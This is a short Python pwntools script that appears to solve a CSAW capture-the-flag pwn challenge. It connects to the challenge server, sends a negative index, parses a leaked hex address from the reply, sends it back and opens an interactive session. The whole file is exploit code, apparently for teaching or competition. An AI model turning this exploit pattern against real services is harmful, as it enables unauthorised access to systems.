from pwn import *

io = remote('pwn.chal.csaw.io', 5002)


print(io.recv())
print(io.recv())
io.sendline('-22')
end = int(io.recv().split()[9].split(b'.')[0], 16)
io.sendline(str(end))
io.interactive()
